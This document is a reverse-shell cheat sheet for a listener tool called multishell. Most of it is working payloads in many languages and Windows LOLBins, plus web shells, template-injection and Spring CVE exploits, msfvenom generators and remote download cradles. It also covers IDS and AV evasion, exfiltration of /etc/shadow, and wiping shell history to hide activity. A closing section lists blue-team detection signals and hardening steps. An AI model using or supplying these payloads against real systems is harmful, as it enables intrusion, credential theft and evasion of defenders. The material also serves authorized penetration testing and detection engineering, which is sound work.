# Reverse Shell Cheat Sheet

Companion reference for **multishell** (or any multi-handler: `pwncat`, `nc -lvp`,
`socat`, Metasploit `multi/handler`).

> For authorized security testing, CTFs, red-team engagements, and
> blue-team detection engineering. Don't point these at machines you
> don't own or have written authorization to test.

---

## Placeholders

- `$LHOST` — your attack box's IP, reachable from the target
- `$LPORT` — your listener port (multishell defaults to `9090`)

Export them once so you can paste the commands verbatim:

```bash
export LHOST=10.10.14.5
export LPORT=9090
```

## Start the listener first

```bash
multishell              # TCP :9090
multishell -p 4444      # different port
```

Once a callback lands, press **Ctrl+U** for PTY upgrade, **Ctrl+F** to
search scrollback, `/put` and `/get` to move files.

---

## Table of contents

1. [Bash / POSIX shell](#1-bash--posix-shell)
2. [Netcat family & socat](#2-netcat-family--socat)
3. [Python](#3-python)
4. [Perl, Ruby, PHP, Node, Lua, Awk, Groovy, Tcl](#4-perl-ruby-php-node-lua-awk-groovy-tcl)
5. [Go / Rust / C](#5-go--rust--c)
6. [Java & JSP](#6-java--jsp)
7. [Windows — PowerShell](#7-windows--powershell)
8. [Windows — cmd.exe & LOLBins](#8-windows--cmdexe--lolbins)
9. [Web-framework injection](#9-web-framework-injection)
10. [Living-off-the-land binaries](#10-living-off-the-land-binaries-lolbins--gtfobins)
11. [Binary generators — msfvenom](#11-binary-generators--msfvenom)
12. [Out-of-band channels](#12-out-of-band-channels)
13. [Encoding, quoting, evasion](#13-encoding-quoting-evasion)
14. [Stabilizing the session](#14-stabilizing-the-session)
15. [Detection signals (blue team)](#15-detection-signals-blue-team)

---

## 1. Bash / POSIX shell

### Bash via `/dev/tcp` (works on most Linux, macOS bash 3.2, Git-for-Windows bash)

```bash
bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
```

```bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
```

Requires bash compiled with `--enable-net-redirections` (default on
Debian/Ubuntu, RHEL, macOS, Alpine's bash package; **not** in Debian
`dash` or BusyBox ash).

### `exec` redirection — no `/dev/tcp` needed on some distros

```bash
exec 5<>/dev/tcp/$LHOST/$LPORT
cat <&5 | while read line; do $line 2>&5 >&5; done
```

### Portable sh via FIFO (when `/dev/tcp` is unavailable)

```sh
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/f
```

### Zsh

```zsh
zsh -c 'zmodload zsh/net/tcp && ztcp $LHOST $LPORT && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

### Fish

```fish
fish -c 'set -l fd (ztcp $LHOST $LPORT); fish >&$fd 2>&$fd 0<&$fd'
```

### OpenSSL (encrypted channel; pair with `openssl s_server` listener)

```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $LHOST:$LPORT > /tmp/s
```

---

## 2. Netcat family & socat

Flavors differ. Always check `nc -h 2>&1 | head -1`.

| Binary                         | `-e` flag? | Notes                          |
| ------------------------------ | ---------- | ------------------------------ |
| `nc` (traditional / Hobbit)    | yes        | rare on modern distros         |
| `nc.openbsd`                   | **no**     | default on Debian/Ubuntu/Kali  |
| `nc.traditional` / `netcat-traditional` | yes | `apt install netcat-traditional` |
| `ncat` (Nmap)                  | yes (`--exec`, `--sh-exec`) | ssl-capable, ipv6, proxy |
| BusyBox `nc`                   | varies     | usually no `-e`                |

### Traditional nc (has `-e`)

```bash
nc -e /bin/sh $LHOST $LPORT
```

### OpenBSD nc (no `-e`) — use a FIFO

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/f
```

### Ncat over TLS (matches `ncat --ssl -lvp $LPORT` on the attacker)

```bash
ncat --ssl $LHOST $LPORT -e /bin/bash
```

### Socat — **gives you a real PTY** on the target (no upgrade needed)

On the attacker:

```bash
socat -d -d file:`tty`,raw,echo=0 tcp-listen:$LPORT
```

On the target:

```bash
socat tcp-connect:$LHOST:$LPORT exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

Socat is the gold standard when available — cleanest session, no `stty` dance.

### Telnet (two-pipe trick, when only telnet exists)

```bash
mknod /tmp/p p && telnet $LHOST $LPORT 0</tmp/p | /bin/sh 1>/tmp/p
```

---

## 3. Python

### Python 3 — classic

```bash
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

### Python 3 — no PTY (slimmer, works where `pty` is restricted)

```bash
python3 -c 'import socket,os,subprocess;s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

### Python 2 (still on older CentOS, legacy appliances)

```bash
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

### One-liner that falls back across Python versions

```bash
(python3 || python) -c 'import socket,os,pty;s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

### Windows Python

```powershell
python -c "import socket,subprocess,os;s=socket.socket();s.connect(('$LHOST',$LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(['cmd.exe'])"
```

---

## 4. Perl, Ruby, PHP, Node, Lua, Awk, Groovy, Tcl

### Perl

```bash
perl -e 'use Socket;$i="'$LHOST'";$p='$LPORT';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Windows Perl (no `/bin/sh`):

```bash
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"'$LHOST':'$LPORT'");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Ruby

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("'$LHOST'","'$LPORT'");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Ruby (full PTY on *nix)

```bash
ruby -rsocket -e 'c=TCPSocket.new("'$LHOST'","'$LPORT'");$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec("/bin/bash","-i")'
```

### PHP

```bash
php -r '$sock=fsockopen("'$LHOST'",'$LPORT');$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

PHP also has `exec`, `shell_exec`, `system`, `passthru`, `popen`,
`proc_open`, `` ` `` backticks — when filters disable some, try the others.

### Node.js

```bash
node -e 'sh=require("child_process").spawn("/bin/sh",[]);var net=require("net"),c=new net.Socket();c.connect('$LPORT',"'$LHOST'",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});'
```

Windows Node:

```bash
node -e 'sh=require("child_process").spawn("cmd.exe");var net=require("net"),c=new net.Socket();c.connect('$LPORT',"'$LHOST'",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});'
```

### Lua

```bash
lua -e 'local s=require("socket");local c=s.connect("'$LHOST'",'$LPORT');while true do local r=c:receive();local f=io.popen(r,"r");local o=f:read("*a");c:send(o);end;'
```

### Awk (GNU awk with `|&` coprocess)

```bash
awk 'BEGIN {s = "/inet/tcp/0/'$LHOST'/'$LPORT'"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){while ((c |& getline) > 0) print $0 |& s; close(c);} } while(c != "exit") close(s); }}' /dev/null
```

### Groovy

```groovy
String host="$LHOST";int port=$LPORT;String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};
p.destroy();s.close();
```

### Tcl

```tcl
echo 'set s [socket $LHOST $LPORT];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
```

---

## 5. Go / Rust / C

### Go — drop-in binary

```go
package main
import ("net";"os/exec";"io")
func main() {
    c,_ := net.Dial("tcp","$LHOST:$LPORT")
    cmd := exec.Command("/bin/sh","-i")
    cmd.Stdin=c; cmd.Stdout=c; cmd.Stderr=c
    cmd.Run()
    io.Copy(c,c)
}
```

Build:

```bash
GOOS=linux   GOARCH=amd64 go build -ldflags="-s -w" -o sh_linux   shell.go
GOOS=darwin  GOARCH=arm64 go build -ldflags="-s -w" -o sh_macarm  shell.go
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o sh.exe     shell.go
```

### Rust

```rust
use std::net::TcpStream; use std::process::{Command,Stdio}; use std::os::unix::io::{FromRawFd,IntoRawFd};
fn main() {
    let s = TcpStream::connect("$LHOST:$LPORT").unwrap();
    let fd = s.into_raw_fd();
    Command::new("/bin/sh").arg("-i")
        .stdin (unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn().unwrap().wait().unwrap();
}
```

### C (minimal, POSIX)

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
int main() {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = { .sin_family=AF_INET, .sin_port=htons($LPORT) };
    inet_pton(AF_INET, "$LHOST", &a.sin_addr);
    connect(s, (struct sockaddr*)&a, sizeof(a));
    dup2(s,0); dup2(s,1); dup2(s,2);
    execl("/bin/sh", "/bin/sh", "-i", NULL);
}
```

Compile: `cc -s -O2 -o sh shell.c` (static: `-static`).

---

## 6. Java & JSP

### Java one-shot (inline)

```java
String host="$LHOST";int port=$LPORT;String[] cmd={"/bin/sh","-c","/bin/sh -i"};
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
java.net.Socket s=new java.net.Socket(host,port);
java.io.InputStream pi=p.getInputStream(),si=s.getInputStream();
java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}
p.destroy();s.close();
```

### JSP (drop into a web-root that executes `.jsp`)

```jsp
<%@ page import="java.lang.*, java.util.*, java.io.*, java.net.*" %>
<%
String host="$LHOST";int port=$LPORT;String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};
p.destroy();s.close();
%>
```

### WAR file (Tomcat) via msfvenom

```bash
msfvenom -p java/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war > shell.war
# deploy at /manager/html → /shell/
curl http://target:8080/shell/
```

---

## 7. Windows — PowerShell

### Full reverse shell (functional "Nishang" style)

```powershell
$c = New-Object System.Net.Sockets.TCPClient("$LHOST",$LPORT);
$s = $c.GetStream(); [byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
  $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
  $sb = (iex $d 2>&1 | Out-String );
  $sb2 = $sb + "PS " + (pwd).Path + "> ";
  $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
  $s.Write($sbt,0,$sbt.Length); $s.Flush()
}; $c.Close()
```

### Base64-encoded one-liner (paste-safe, avoids quote-escaping hell)

1. Encode on attacker:

```bash
CMD='$c=New-Object System.Net.Sockets.TCPClient("'$LHOST'",'$LPORT');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()'
echo -n "$CMD" | iconv -t UTF-16LE | base64 -w0
```

2. Paste on target:

```cmd
powershell -nop -w hidden -EncodedCommand <BASE64>
```

### Short PowerShell v2 variant

```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TcpClient('$LHOST',$LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$rb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($rb,0,$rb.Length);$s.Flush()}"
```

### PowerShell over TLS (pair with `openssl s_server` on attacker)

```powershell
$c=New-Object System.Net.Sockets.TCPClient("$LHOST",$LPORT);
$ssl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,({$true}));
$ssl.AuthenticateAsClient("$LHOST");$s=$ssl;
[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r+"PS> ");$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()
```

### Download cradle (fetch + execute a remote .ps1)

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/rev.ps1')
iwr -useb http://$LHOST/rev.ps1 | iex
```

### PowerCat (ncat-like in pure PowerShell)

```powershell
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1")
powercat -c $LHOST -p $LPORT -e cmd
```

---

## 8. Windows — cmd.exe & LOLBins

cmd.exe has no native TCP client, so you bring one in.

### certutil download + run `nc.exe`

```cmd
certutil -urlcache -split -f http://$LHOST/nc.exe C:\Windows\Temp\nc.exe && C:\Windows\Temp\nc.exe -e cmd.exe $LHOST $LPORT
```

### bitsadmin download

```cmd
bitsadmin /transfer j /priority foreground http://$LHOST/nc.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe -e cmd.exe $LHOST $LPORT
```

### mshta (fetches and runs HTML/JScript)

Attacker: host `payload.hta` containing a PowerShell download cradle.

```cmd
mshta http://$LHOST/payload.hta
```

### regsvr32 (Squiblydoo — `.sct` file runs script code)

```cmd
regsvr32 /s /n /u /i:http://$LHOST/shell.sct scrobj.dll
```

### rundll32 + JScript

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new ActiveXObject("WScript.Shell").Run("powershell -c IEX(IWR http://$LHOST/rev.ps1 -UseB)")
```

### WMIC XSL

```cmd
wmic os get /FORMAT:"http://$LHOST/evil.xsl"
```

---

## 9. Web-framework injection

### Flask / Jinja2 SSTI (template injection → RCE)

Detect with `{{7*7}}` → `49`. Exploit:

```
{{ ''.__class__.__mro__[1].__subclasses__()[<idx>]('bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"', shell=True) }}
```

Modern Flask/Jinja2 common payload:

```
{{ config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT"' 0>&1"').read() }}
```

One-liner using `|attr` to bypass bracket filters:

```
{{ (lipsum|attr("__globals__")).get("os").popen("bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1").read() }}
```

### Django SSTI (rarer — only with custom template config)

```
{% debug %}  → leaks context
{{ request.user.is_superuser }}  → truthiness oracle
```

Django typically requires full code exec via `pickle` in a session or
`__import__` via a gadget in `exec()`.

### PHP web shell (drop → trigger)

Minimal (careful — trivially detected):

```php
<?php system($_GET["c"]); ?>
```

Trigger:

```
GET /upload/shell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'
```

More evasive (no `system`/`eval`/`exec` strings):

```php
<?php ($_=`${\('_'.'GET')}['c']`) && die(`$_`); ?>
```

### ASP.NET / aspx

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<% Process p=new Process(); p.StartInfo.FileName="cmd.exe";
p.StartInfo.Arguments="/c powershell IEX(IWR http://$LHOST/rev.ps1 -UseB)";
p.StartInfo.UseShellExecute=false; p.StartInfo.RedirectStandardOutput=true;
p.Start(); Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>"); %>
```

### Spring Boot — SpEL / actuator-gateway

Historical CVE-2022-22963 (`spring.cloud.function`):

```bash
curl http://target:8080/functionRouter -X POST \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/'$LHOST'/'$LPORT' 0>&1"})' \
  -d 'x'
```

### Ruby on Rails — ERB / YAML deserialization

```erb
<%= `bash -c 'bash -i >& /dev/tcp/#{ENV["LHOST"]}/#{ENV["LPORT"]} 0>&1'` %>
```

### GraphQL with introspection enabled → batch queries, field-chaining DoS, auth bypass

Not a reverse shell per se; chain the resulting auth bypass into one of the
shells above once you have code-exec context.

---

## 10. Living-off-the-land binaries (LOLBins / GTFOBins)

Many admin-installed binaries will spawn a shell if run with the right flags
(see [gtfobins.github.io](https://gtfobins.github.io) and
[lolbas-project.github.io](https://lolbas-project.github.io)).

### Some of the greatest hits

| Binary      | Spawn                                                   |
| ----------- | ------------------------------------------------------- |
| `vim`       | `:!bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'`    |
| `less`      | `!bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'`     |
| `man`       | `!bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'`     |
| `find . -exec` | `find . -exec /bin/sh -i \; -quit`                   |
| `nmap`      | `nmap --interactive` → `!sh`                            |
| `socat`     | see §2                                                  |
| `ssh`       | `ssh -o ProxyCommand=';sh -i </dev/tty 2>&0 >&0' x`     |
| `awk`       | `awk 'BEGIN {system("/bin/sh")}'`                       |
| `gdb`       | `gdb -nx -ex '!sh' -ex quit`                            |
| `Python*`   | `python -c 'import os;os.system("sh -i")'`              |

All of these assume you already have a way to execute them (often via
`sudo` misconfig) — point them at `/bin/bash -i >& /dev/tcp/...` to turn
a local shell into a reverse one.

---

## 11. Binary generators — msfvenom

Pairs nicely with multishell's `/put` to drop straight into the target.

### Windows EXE (stageless)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
msfvenom -p windows/shell_reverse_tcp     LHOST=$LHOST LPORT=$LPORT -f exe -o shell32.exe
```

### Linux ELF

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
```

### macOS Mach-O

```bash
msfvenom -p osx/x64/shell_reverse_tcp   LHOST=$LHOST LPORT=$LPORT -f macho -o shell.macho
```

### Web-app payloads (trivial to swap the language)

```bash
msfvenom -p php/reverse_php   LHOST=$LHOST LPORT=$LPORT -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shell.jsp
msfvenom -p java/shell_reverse_tcp    LHOST=$LHOST LPORT=$LPORT -f war -o shell.war
msfvenom -p cmd/unix/reverse_bash     LHOST=$LHOST LPORT=$LPORT -f raw
```

### Python standalone

```bash
msfvenom -p python/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shell.py
```

### NOP sled / shellcode (buffer-overflow land)

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f python -b '\x00\x0a\x0d'
```

Use `-b` to exclude bad characters, `-e` to pick an encoder,
`-i` for iterations. Modern EDR catches stock encoders — consider
custom loaders / donut / sgn instead.

---

## 12. Out-of-band channels

### HTTPS reverse shell (hard to distinguish from legit traffic)

Use `ligolo-ng`, `chisel`, or a C2 framework (Sliver, Mythic, Havoc).
Quick `chisel`:

```bash
# attacker
chisel server -p 443 --reverse --tls-key k.pem --tls-cert c.pem
# target
chisel client https://$LHOST:443 R:0.0.0.0:$LPORT:socks
```

### DNS tunnel (when only DNS egresses)

`iodine`, `dnscat2`:

```bash
# attacker (needs auth NS for yourdomain.com)
dnscat2-server.rb yourdomain.com
# target
./dnscat2 yourdomain.com
```

Slow (tens of KB/min), but works through captive portals, isolated VLANs,
air-gapped proxies.

### ICMP tunnel

`icmpsh`, `ptunnel`, `hans`. Requires raw sockets / NET_CAP_RAW on the target.

### WebSocket

```javascript
// on a compromised browser via XSS
var ws = new WebSocket('wss://$LHOST/ws');
ws.onmessage = e => eval(e.data);
```

---

## 13. Encoding, quoting, evasion

### When direct quoting is a nightmare

**Base64 the whole payload.** Target-side:

```bash
echo <base64> | base64 -d | bash
```

```powershell
powershell -EncodedCommand <UTF16LE-base64>
```

Key gotcha: PowerShell's `-EncodedCommand` expects **UTF-16 LE**, not UTF-8.

```bash
echo -n "$POWERSHELL_CMD" | iconv -t UTF-16LE | base64 -w0
```

### When commands land in a URL / query string

URL-encode spaces (`%20`), ampersands (`%26`), redirections (`%3E` for `>`).

```
bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
 → bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FLHOST%2FLPORT%200%3E%261'
```

### Dodging basic string-matching IDS

- Split `/bin/sh` into `/bi` `n/s` `h`.
- Replace `bash -c` with `$0 -c` from a script named `bash`.
- Use `${IFS}` instead of spaces.
- Use `wget` vs `curl` vs `fetch` (BSD) — some sensors only alert on `curl`.
- PowerShell: `$env:ComSpec` instead of `cmd.exe`, `[char]`-constructed strings.

### Bash without spaces (space-filtered inputs)

```bash
{bash,-c,'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'}
```

### `${IFS}` trick

```bash
cat${IFS}/etc/passwd
```

### Heredoc exfil (when stdout is captured but stdin is free)

```bash
base64 /etc/shadow | while read l; do curl -d "$l" http://$LHOST/; done
```

### Avoiding AV by compiling on-target

If `cc` exists, push the source with multishell's `/put` and compile there —
skips file-based AV that's tuned for common shellcode signatures.

---

## 14. Stabilizing the session

Pasted shell is half the battle; making it *usable* is the other half.

### Step 1 — get a PTY

multishell: **Ctrl+U** (or `/pty`). Under the hood:

```bash
python3 -c 'import pty,os;pty.spawn([os.environ.get("SHELL","/bin/bash"),"-i"])'
# macOS-native fallback when python3 missing:
script -q /dev/null /bin/bash
# Linux fallback:
script -qc /bin/bash /dev/null
```

### Step 2 — match sizes

From the attacker's terminal, grab size:

```bash
stty -a | head -1
# speed 38400 baud; rows 40; columns 120; line = 0;
```

In the (now PTY'd) target:

```bash
stty rows 40 cols 120
export TERM=xterm-256color
```

multishell's PTY upgrade already does this.

### Step 3 — disable local echo, background nc/handler for raw mode (non-multishell)

Only needed if you're using raw `nc`/`socat` without a proper TUI:

```
Ctrl+Z                     # bg the local listener
stty raw -echo; fg          # kernel no longer buffers; listener resumes
# at target prompt:
reset                       # clean the screen
```

multishell does not require this — its TUI is line-oriented, and the PTY
upgrade makes the remote side support arrow keys, tab completion,
`vim`, `less`, `top`, etc. To drive interactive full-screen apps you
currently still type into the multishell Input (line by line). Raw-pass
mode is a roadmap item.

### Step 4 — clean up history

```bash
export HISTFILE=/dev/null     # bash/zsh
unset HISTFILE                # ksh
history -c                    # purge current session
kill -9 $$                    # nukes the shell (prevents flush on clean exit)
```

PowerShell:

```powershell
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
```

---

## 15. Detection signals (blue team)

If you're on the other side, watch for:

- **Process-parent anomalies**: `bash` with parent `httpd`, `nginx`,
  `postgres`, `mysql`, `redis-server` — a web process spawning a shell
  is almost always malicious.
- `/dev/tcp/` in bash `auditd` command lines.
- PowerShell with `-EncodedCommand`, `-NoProfile`, `-NonInteractive`,
  `-WindowStyle Hidden`, or the `iex (iwr …)` download cradle.
- `certutil`, `bitsadmin`, `mshta`, `regsvr32` reaching out to the
  internet — all rarely legit.
- `python -c 'import socket` or `perl -e 'use Socket` in process args.
- Outbound TCP to non-business ports (4444, 9001, 8080, 9090) from
  server processes that normally only serve.
- Long-lived connections with near-zero traffic volume interleaved with
  sudden bursts (C2 beacon shape).
- Missing TTY on a shell that runs `sudo` / reads `/etc/shadow` —
  legit admin activity usually comes over SSH with a TTY.

Defensive hardening:

- Compile bash with `--disable-net-redirections` on internet-facing
  hosts (breaks `/dev/tcp`).
- Egress filtering: default-deny outbound except explicit proxies.
- AppLocker / WDAC on Windows to block unsigned `nc.exe`, unsigned
  `.hta`, unsigned PS scripts.
- Sysmon event 1 + 3 with tuned filters → SIEM.
- `auditd` rules for `execve` of `bash -i`, `sh -i`, `nc -e`.

---

## Quick-reference: matching a target to a shell

| Target environment                           | First thing to try                                                        |
| -------------------------------------------- | ------------------------------------------------------------------------- |
| Modern Linux server, bash default            | `bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1`                                  |
| Alpine / BusyBox                             | sh + FIFO + nc                                                            |
| macOS with Xcode CLT                         | python3 one-liner                                                         |
| macOS *without* Xcode CLT                    | `bash -i >& /dev/tcp/…` (bash 3.2 has it) or `script -q /dev/null bash`   |
| Windows Server 2019+                         | PowerShell base64 one-liner                                               |
| Windows embedded / restricted PS             | mshta + .hta with WScript.Shell                                           |
| Web app with Python template                 | Flask/Jinja SSTI → `popen` to bash                                        |
| Web app with PHP                             | `<?php system($_GET['c']); ?>` → `bash -c 'bash -i >& /dev/tcp/…'`        |
| Java / Tomcat                                | JSP webshell or WAR deploy                                                |
| Rails                                        | ERB injection with backticks                                              |
| Hardened egress, only :443 out               | chisel / ligolo / Sliver over TLS                                         |
| DNS only                                     | dnscat2 / iodine                                                          |

---

## Pair with multishell

Once you land on `:9090`, the workflow is:

1. Session appears in the sidebar — fingerprint auto-runs (OS/user/host).
2. **Ctrl+U** — PTY upgrade. Should show `PTY ready (rows×cols)`.
3. `/tag web-prod-01` — rename the session to something meaningful.
4. `/note found rails secret_key_base at /opt/app/.env` — stick a note on it.
5. `/put ~/tools/linpeas.sh /tmp/.x` — drop a tool. sha256 verified.
6. `/get /etc/shadow` — exfil. Lands in `~/.multishell/loot/session-NNNN/`.
7. `Ctrl+F` — later, search across every session you've ever run for
   `password`, `token`, `AKIA`, etc.

Every session is recorded as an asciinema `.cast` — replay evidence for
the report with `asciinema play ~/.multishell/sessions/<…>.cast`.
